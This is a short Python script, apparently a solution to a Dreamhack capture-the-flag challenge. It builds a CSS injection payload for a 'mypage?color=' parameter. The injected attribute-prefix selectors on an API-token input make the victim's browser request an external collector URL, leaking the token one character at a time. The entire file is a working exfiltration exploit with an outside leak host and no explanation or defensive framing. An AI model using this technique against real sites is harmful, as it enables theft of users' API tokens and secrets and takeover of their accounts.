from urllib.parse import quote

LEAK_HOST = "https://kvsjftc.request.dreamhack.games/leak"
chars = "abcdefghijklmnopqrstuvwxyz"

def payload(known_prefix):
    rules = ""
    for ch in chars:
        candidate = known_prefix + ch
        rules += (
            f"#InputApitoken[value^={candidate}]"
            f"{{background:url({LEAK_HOST}?c={quote(candidate)})!important;}}"
        )
    css = "red;}" + rules
    return "mypage?color=" + quote(css)

print(payload(""))
